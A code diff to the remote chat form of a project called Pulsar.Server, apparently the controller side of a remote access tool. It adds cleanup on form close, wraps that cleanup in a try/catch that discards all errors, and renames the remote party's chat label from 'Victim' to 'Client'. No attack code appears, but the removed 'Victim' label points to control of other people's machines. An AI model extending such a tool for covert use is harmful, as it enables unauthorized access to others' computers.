@@ -55,12 +55,19 @@ namespace Pulsar.Server.Forms
             chatHandler.PacketsRetrieved += AddMessageClient;
             MessageHandler.Register(chatHandler);
         }
-
+        
         private void UnregisterMessageHandler()
         {
-            MessageHandler.Unregister(chatHandler);
-            chatHandler.PacketsRetrieved -= AddMessageClient;
-            _connectClient.ClientState -= ClientDisconnected;
+            try
+            {
+                MessageHandler.Unregister(chatHandler);
+                chatHandler.PacketsRetrieved -= AddMessageClient;
+                _connectClient.ClientState -= ClientDisconnected;
+            }
+            catch (Exception)
+            {
+                // Ignore exceptions during cleanup
+            }
         }
 
         private void FrmRemoteChat_Load(object sender, EventArgs e)
@@ -68,21 +75,24 @@ namespace Pulsar.Server.Forms
 
             this.Text = WindowHelper.GetWindowTitle("Remote Chat | ", _connectClient);
         }
-
+        
         private void FrmRemoteChat_FormClosing(object sender, FormClosingEventArgs e)
         {
             chatHandler.KillForm();
+            UnregisterMessageHandler();
         }
+
         public void AddMessageClient(object sender, string message)
         {
             if (this.IsHandleCreated && !this.Disposing && !this.IsDisposed)
             {
                 Chatlog.Invoke((MethodInvoker)delegate
                 {
-                    Chatlog.AppendText(string.Format("{0} {1}: {2}{3}", DateTime.Now.ToString("HH:mm:ss"), "Victim", message, Environment.NewLine));
+                    Chatlog.AppendText(string.Format("{0} {1}: {2}{3}", DateTime.Now.ToString("HH:mm:ss"), "Client", message, Environment.NewLine));
                 });
             }
         }
+
         public void AddMessageServer(object sender, string message)
         {
             Chatlog.Invoke((MethodInvoker)delegate
